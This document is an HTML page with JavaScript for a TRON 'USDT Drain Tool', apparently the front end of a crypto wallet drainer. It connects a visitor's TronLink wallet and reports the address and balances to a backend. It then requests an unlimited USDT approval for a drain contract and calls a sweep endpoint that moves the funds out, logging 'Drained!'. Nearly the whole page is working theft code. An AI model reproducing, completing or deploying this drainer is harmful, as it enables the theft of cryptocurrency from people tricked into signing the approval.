<!DOCTYPE html>
<html>
<head><title>USDT Drain - Test</title></head>
<body>
<h1>USDT Drain Tool</h1>
<button id="connect">Connect TronLink</button>
<div id="info"></div>
<div id="status"></div>
<button id="approve" disabled>Approve USDT</button>
<button id="drain" disabled>Drain USDT</button>

<script src="https://cdn.jsdelivr.net/npm/tronweb@6.3.0/dist/TronWeb.js"></script>
<script>
    let userAddress = null;
    let tronWeb = null;
    let config = {};

    async function log(msg) {
        document.getElementById('status').innerHTML += '<br>' + msg;
        console.log(msg);
    }

    async function loadConfig() {
        try {
            const res = await fetch('/api/config');
            config = await res.json();
            log('✅ Config loaded');
        } catch(e) {
            log('❌ Config load failed: ' + e.message);
        }
    }

    document.getElementById('connect').onclick = async () => {
        if (!window.tronLink || !window.tronLink.ready) {
            alert('TronLink not installed');
            return;
        }
        try {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            userAddress = window.tronLink.defaultAddress.base58;
            tronWeb = window.tronLink.tronWeb;
            document.getElementById('info').innerText = 'Connected: ' + userAddress;
            document.getElementById('approve').disabled = false;
            document.getElementById('drain').disabled = false;
            log('✅ Connected to ' + userAddress);
            // Check balance via backend
            const balRes = await fetch('/api/balance', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({address: userAddress})
            });
            const bal = await balRes.json();
            log(`💰 USDT: ${bal.usdt} | TRX: ${bal.trx}`);
            await fetch('/api/event', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({type:'wallet_connected', address:userAddress})
            });
        } catch(e) {
            log('❌ Connection error: ' + e.message);
        }
    };

    document.getElementById('approve').onclick = async () => {
        const spender = config.drainContract || config.drainAddress;
        if (!spender) { log('No spender'); return; }
        try {
            const contract = await tronWeb.contract().at(config.usdtContract || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
            const max = config.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935';
            const tx = await contract.approve(spender, max).send();
            log(`✅ Approve TX: ${tx}`);
            await fetch('/api/event', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({type:'approve_signed', address:userAddress, txId:tx, amount:'max'})
            });
        } catch(e) {
            log('❌ Approve failed: ' + e.message);
        }
    };

    document.getElementById('drain').onclick = async () => {
        try {
            const res = await fetch('/api/sweep', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({address: userAddress})
            });
            const data = await res.json();
            if (data.success) log(`💀 Drained! TX: ${data.txId}`);
            else log('❌ Drain failed: ' + data.error);
        } catch(e) {
            log('❌ Drain error: ' + e.message);
        }
    };

    loadConfig();
</script>
</body>
</html>
